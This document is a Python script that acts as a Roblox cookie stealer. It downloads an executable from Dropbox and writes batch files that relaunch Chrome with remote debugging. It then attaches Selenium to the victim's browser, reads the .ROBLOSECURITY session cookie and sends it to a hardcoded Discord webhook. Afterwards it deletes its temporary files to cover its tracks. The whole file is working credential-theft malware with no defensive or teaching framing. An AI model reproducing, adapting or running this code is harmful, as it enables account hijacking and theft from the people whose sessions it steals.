from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import os
import requests
from discord import Webhook, RequestsWebhookAdapter
from selenium.webdriver.chrome.service import Service
from subprocess import CREATE_NO_WINDOW
import winshell
import time

#find chrome
def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)

def find_all(name, path):
    result = []
    for root, dirs, files in os.walk(path):
        if name in files:
            result.append(os.path.join(root, name))
    return result
#get driver
url = 'https://www.dropbox.com/s/vt98h2ftu0x2yc4/de.exe?dl=1'
r = requests.get(url, allow_redirects=True)
open('de.exe', 'wb').write(r.content)
#get bat
cBat = open(r'c.bat','w+')
truepath = str(find('chrome.exe', r'C:\Program Files')).replace('\chrome.exe','')
if truepath == 'None':
    truepath = str(find('chrome.exe', r'C:\Program Files (x86)')).replace('\chrome.exe','')
cBat.write(r'cd '+ truepath)
cBat.write('\n'+r'chrome.exe -remote-debugging-port=9222')
#cBat.write('\nexit')
cBat.close()

dBat = open(r'd.bat','w+')
dBat.write(r'taskkill /f /im de.exe')
dBat.write('\nexit')
dBat.close()
#start grab
os.system(r'start c.bat')
options1 = Options()
options1.add_experimental_option("debuggerAddress", "127.0.0.1:9222")
#Change chrome driver path accordingly
chrome_driver = r"de.exe"
driver = webdriver.Chrome(executable_path=chrome_driver, options=options1)
driver.get('https://www.roblox.com')
cookies = driver.get_cookies()
driver.close()
#send cookie
for cookie in cookies:
    if "'.ROBLOSECURITY'," in str(cookie):
        print("working")
        webhook = Webhook.from_url("https://discord.com/api/webhooks/872171367661977661/xlyY2RmoWT4Inx2253Sb0XaR2-ZpLGsO6oia7Un5hhr6wyKZHBiaHn8f7sLi8wVqTSTf", adapter=RequestsWebhookAdapter())
        webhook.send(cookie)
        print(cookie)
#delete files
os.system(r'd.bat')
time.sleep(0.25)
os.remove("c.bat")
os.remove("d.bat")
os.remove("de.exe")
print('finished')
